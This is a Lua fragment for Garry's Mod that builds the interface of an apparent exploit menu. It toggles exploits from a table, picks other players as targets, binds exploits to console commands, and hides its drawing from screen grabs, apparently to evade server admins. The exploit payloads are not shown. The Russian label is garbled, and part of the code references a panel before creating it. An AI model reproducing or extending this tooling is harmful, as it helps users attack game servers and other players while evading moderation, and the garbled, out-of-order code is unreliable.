for _, exploit in pairs( exploits ) do
    if exploit.check() then
        if exploit.tn and timer.Exists( '_z_em_' .. exploit.tn ) then
            timer.Remove( '_z_em_' .. exploit.tn )
            if exploit.deact then
                exploit.deact()
            end
        end
        exploitavailable = exploitavailable + 1
        
        local col = 45
        local but = vgui.Create( 'DButton', dply )
        but:SetSize( 0, 40 )
        but:SetText( '' )
        function but:Paint( w, h )
            if scrgrb() then
                return
            end
            
            if exploit.active then
                if col < 175 then
                    col = Lerp( FrameTime() * 10, col, 175 )
                end
            elseif col > 0 then
                col = Lerp( FrameTime() * 10, col, 0 )
            end
            
            surface.SetDrawColor( 255, 255, 255, 128 )
            surface.DrawOutlinedRect( 0, 0, w, h, 1 )
            
            surface.SetDrawColor( 0, col, 0, 175 )
            surface.DrawRect( 1, 1, w - 2, h - 2 )
            
            local status = exploit.status
            surface.SetFont( '_z_em' )
            surface.SetTextColor( 100, 100, 100 )
            
            surface.SetTextPos( w - surface.GetTextSize( status ) - 2, 2.5 )
            surface.DrawText( status )
            
            surface.SetTextColor( 255, 255, 255 )
            local name = exploit.name
            surface.SetTextPos( ( w - surface.GetTextSize( name ) ) / 2, 2.5 )
            surface.DrawText( name )
            
            local desc = exploit.desc
            surface.SetFont( '_z_emm' )
            surface.SetTextPos( w / 2 - surface.GetTextSize( desc ) / 2, 20 )
            surface.DrawText( desc )
        end
        
        function but:OnCursorEntered()
            playsound( sounds[ 1 ] )
        end
        
        function but:DoClick()
            local active = exploit.active
            if !active then
                playsound( sounds[ 2 ] )
            end
        
            local t = exploit.t
            local act = exploit.act
            local deact = exploit.deact
            local func = exploit.func
            
            if isnumber( t ) then
                if active then
                    if func then
                        timer.Remove( '_z_em_' .. exploit.tn )
                    end
                    exploit.active = false
                    playsound( sounds[ 3 ] )
                    if deact then
                        deact()
                    end
                    
                    local tags = exploit.tags
                    if tags then
                        for name in pairs( tags ) do
                            exploitinfo[ name ] = nil
                        end
                    end
                else
                    local tags = exploit.tags
                    if tags then
                        for name, value in pairs( tags ) do
                            exploitinfo[ name ] = value
                        end
                    end
                    
                    if act then
                        act()
                    end
                    
                    if func then
                        timer.Create( '_z_em_' .. exploit.tn, math.max( t, .01 ), 0, exploit.func )
                    end
                    exploit.active = true
                end
            else
                if func then
                    exploit.func()
                end
                
                exploit.active = true
                
                timer.Simple( .1, function()
                    exploit.active = false
                end )
            end
        end
        binds[ exploit.name ] = function()
            but:DoClick()
        end
        dexp:AddItem( but )
    end
end

local dplypan = vgui.Create( 'DPanel', menu )
dplypan:SetPos( scrw - 15, 20 )
dplypan.Opened = false
dplypan.w = 0
dplypan:SetSize( 315, scrh - 45 )

function dplypan:Think()
    if self.Opened and self.w < 315 then
        self.w = Lerp( FrameTime() * 10, self.w, 315 )
        dplypan:SetPos( scrw - self.w, 25 )
    elseif !self.Opened and self.w > 15 then
        self.w = Lerp( FrameTime() * 10, self.w, 15 )
        dplypan:SetPos( scrw - self.w, 25 )
    end
end

function dplypan:Paint( w, h )
    if scrgrb() then
        return
    end
    
    surface.SetDrawColor( 255, 255, 255, 128 )
    surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    
    surface.SetDrawColor( 50, 50, 50, 175 )
    surface.DrawRect( 1, 1, w - 2, h - 2 )
    
    surface.SetDrawColor( 25, 25, 25, 175 )
    surface.DrawRect( 15, 1, w - 17, h - 2 )
end

local dply = vgui.Create( 'DPanelList', dplypan )
dply:SetSize( 300, scrh - 85 )
dply:SetPos( 15, 20 )
dply:SetPadding( 5 )
dply:SetSpacing( 1 )
dply:EnableVerticalScrollbar()

local selectall = vgui.Create( 'DButton', dplypan )
selectall:SetSize( 300, 20 )
selectall:SetPos( 15, scrh - 65 )
selectall:SetText( '' )

function selectall:Paint( w, h )
    if scrgrb() then
        return
    end
    
    surface.SetDrawColor( 255, 255, 255, 128 )
    surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    
    surface.SetDrawColor( 75, 75, 75, 175 )
    surface.DrawRect( 1, 1, w - 2, h - 2 )
    
    surface.SetTextColor( 255, 255, 255 )
    surface.SetFont( '_z_em' )
    local tw = surface.GetTextSize( 'Ð’Ñ‹Ð±Ñ€Ð°Ñ‚ÑŒ Ð²ÑÐµÑ…' )
    surface.SetTextPos( ( w - tw ) / 2, 0 )
    surface.DrawText( 'Ð’Ñ‹Ð±Ñ€Ð°Ñ‚ÑŒ Ð²ÑÐµÑ…' )
end

function selectall:OnCursorEntered()
    playsound( sounds[ 1 ] )
end

function selectall:DoClick()
    playsound( sounds[ 2 ] )
    
    local plys = player.GetHumans()
    
    for i = 1, #plys do
        local ply = plys[ i ]
        
        if selectedall then
            selectedplys[ ply ] = nil
        else
            if !whitelist[ ply ] and ply ~= lply then
                selectedplys[ ply ] = true
            end
        end
    end
    
    selectedall = !selectedall
end

local dplyopen = vgui.Create( 'DButton', dplypan )
dplyopen:SetSize( 15, scrh - 45 )
dplyopen:SetText( '' )

function dplyopen:Paint( w, h )
    if scrgrb() then
        return
    end
    
    surface.SetDrawColor( 255, 255, 255, 128 )
    surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    
    surface.SetDrawColor( 75, 75, 75, 175 )
    surface.DrawRect( 1, 1, w - 2, h - 2 )
    
    surface.SetTextColor( 255, 255, 255 )
    surface.SetFont( '_z_em' )
    local _, th = surface.GetTextSize( '>' )
    surface.SetTextPos( 3, ( h - th ) / 2 )
    surface.DrawText( dplypan.Opened and '>' or '<' )
end

function dplyopen:OnCursorEntered()
    playsound( sounds[ 1 ] )
end

function dplyopen:DoClick()
    dplypan.Opened = !dplypan.Opened
end

if dply.DVScrollbar then
    function dply.DVScrollbar:Paint()
    end
end

concommand.Remove( '_z_open' )
concommand.Add( '_z_open', function()
    if antiexpdetect then
        antiexpdetect = false
        playsound( sounds[ 4 ] )
    end
    
    menu:Show()
    menu:Center()
    
    local items = dply:GetItems()
    for i = 1, #items do
        local item = items[ i ]
        
        if item then
            local ply = item.ply
            
            if !ply:IsValid() and selectedplys[ ply ] then
                selectedplys[ ply ] = nil
            end
            
            item:Remove()
        end
    end
    
    local plys = player.GetAll()
    table.sort( plys, function( a, b )
        return a:Team() > b:Team()
    end )
    
    for i = 1, #plys do
        local ply = plys[ i ]
        if ply ~= lply or whitelist[ ply:SteamID() ] then
            local col = selectedplys[ ply ] and 200 or 0
            local but = vgui.Create( 'DButton', dply )
            but:SetSize( 0, 35 )
            but:SetText( '' )
            
            function but:Paint( w, h )
                if scrgrb() then
                    return
                end
                
                if !ply:IsValid() then
                    selectedplys[ ply ] = nil
                    self:Remove()
                    return
                end
                
                if col < 200 and selectedplys[ ply ] then
                    col = Lerp( FrameTime() * 10, col, 200 )
                elseif col > 0 and !selectedplys[ ply ] then
                    col = Lerp( FrameTime() * 10, col, 0 )
                end
                surface.SetDrawColor( 255, 255, 255, 128 )
                surface.DrawOutlinedRect( 0, 0, w, h, 1 )
                
                surface.SetDrawColor( 0, col, 0, 175 )
                surface.DrawRect( 1, 1, w - 2, h - 2 )
                
                surface.SetFont( '_z_em' )
                surface.SetTextColor( 255, 255, whitelist[ ply:SteamID() ] and 0 or 255 )
                local name = ply:Name()
                surface.SetTextPos( w / 2 - surface.GetTextSize( name ) / 2, 2.5 )
                surface.DrawText( name )
                
                surface.SetFont( '_z_emm' )
                surface.SetTextPos( 5, h - 15 )
                surface.DrawText( ply:GetUserGroup() )
                
                local text = team.GetName( ply:Team() )
                surface.SetTextPos( w - surface.GetTextSize( text ) - 5, h - 15 )
                surface.DrawText( text )
            end
            
            function but:OnCursorEntered()
                playsound( sounds[ 1 ] )
            end
            
            function but:DoClick()
                if selectedplys[ ply ] then
                    selectedplys[ ply ] = nil
                else
                    selectedplys[ ply ] = true
                end
            end
            
            but.ply = ply
            dply:AddItem( but )
        end
    end
end )

concommand.Remove( '_z_exp' )
concommand.Add( '_z_exp', function( _, _, _, text )
    local bind = binds[ text ]
    if bind then
        bind()
    else
        print( 'not found' )
    end
end )

-- vk.com/urbanichka